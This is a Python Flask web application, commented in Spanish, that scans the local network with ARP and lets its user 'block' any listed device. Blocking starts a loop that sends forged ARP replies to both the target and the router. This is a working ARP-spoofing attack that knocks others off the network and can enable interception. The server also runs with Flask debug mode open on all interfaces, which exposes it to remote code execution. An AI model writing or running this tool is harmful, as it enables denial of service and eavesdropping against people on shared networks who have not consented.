from flask import Flask, render_template, request, jsonify
from scapy.all import ARP, Ether, srp, send, conf
import socket
import threading
import time
import json
import os
import logging


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

app = Flask(__name__)


MI_IP = ""
ROUTER_IP = ""
RANGO_RED = ""
INMUNES = []
active_blocks = {}
ARCHIVO_NOMBRES = 'dispositivos.json'

def cargar_nombres():
    """Carga los nombres guardados vinculados a las direcciones MAC."""
    if os.path.exists(ARCHIVO_NOMBRES):
        try:
            with open(ARCHIVO_NOMBRES, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def guardar_nombres(nombres):
    """Guarda los nombres en el archivo JSON."""
    with open(ARCHIVO_NOMBRES, 'w') as f:
        json.dump(nombres, f, indent=4)

def auto_detect_network():
    """Detecta automáticamente la IP local, el Router y el Rango de Red."""
    global MI_IP, ROUTER_IP, RANGO_RED, INMUNES
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        MI_IP = s.getsockname()[0]
        s.close()

        ROUTER_IP = conf.route.route("0.0.0.0")[2]
        base_ip = MI_IP.rsplit('.', 1)[0]
        RANGO_RED = f"{base_ip}.0/24"
        INMUNES = [MI_IP, ROUTER_IP]
        
        print(f"[*] Sistema Iniciado | Mi IP: {MI_IP} | Router: {ROUTER_IP} | Rango: {RANGO_RED}")
    except Exception as e:
        print(f"[!] Error auto-detectando la red: {e}")

def get_clients():
    """Escanea la red buscando dispositivos."""
    try:
        arp = ARP(pdst=RANGO_RED)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=3, retry=2, verbose=0)[0]
        
        nombres_guardados = cargar_nombres()
        clients = []
        
        for _, received in result:
            if received.psrc not in INMUNES:
                mac_address = received.hwsrc.upper()
                clients.append({
                    'ip': received.psrc, 
                    'mac': mac_address,
                    'name': nombres_guardados.get(mac_address, "Dispositivo Desconocido"),
                    'status': 'bloqueado' if active_blocks.get(received.psrc) else 'libre'
                })
        return clients
    except Exception as e:
        print(f"Error en escaneo: {e}")
        return []

def spoof_loop(target_ip):
    """Ejecuta el bloqueo continuamente."""
    while active_blocks.get(target_ip):
        send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=ROUTER_IP), verbose=False)
        send(ARP(op=2, pdst=ROUTER_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip), verbose=False)
        time.sleep(2)

@app.route('/')
def index():
    return render_template('index.html', mi_ip=MI_IP, router_ip=ROUTER_IP)

@app.route('/scan')
def scan():
    return jsonify(get_clients())

@app.route('/rename', methods=['POST'])
def rename():
    """Ruta para guardar el nombre de un dispositivo."""
    data = request.json
    mac = data.get('mac')
    nuevo_nombre = data.get('name')
    
    nombres = cargar_nombres()
    nombres[mac] = nuevo_nombre
    guardar_nombres(nombres)
    
    return jsonify({"status": "success"})

@app.route('/block', methods=['POST'])
def block():
    ip = request.json.get('ip')
    if ip in INMUNES:
        return jsonify({"status": "error", "message": "Dispositivo protegido (Inmune)."})

    if not active_blocks.get(ip):
        active_blocks[ip] = True
        threading.Thread(target=spoof_loop, args=(ip,), daemon=True).start()
        return jsonify({"status": "banned"})
    return jsonify({"status": "ya estaba bloqueado"})

@app.route('/unblock', methods=['POST'])
def unblock():
    ip = request.json.get('ip')
    active_blocks[ip] = False
    return jsonify({"status": "unbanned"})

if __name__ == '__main__':
    conf.verb = 0 
    auto_detect_network()
    app.run(host='0.0.0.0', port=5000, debug=True)
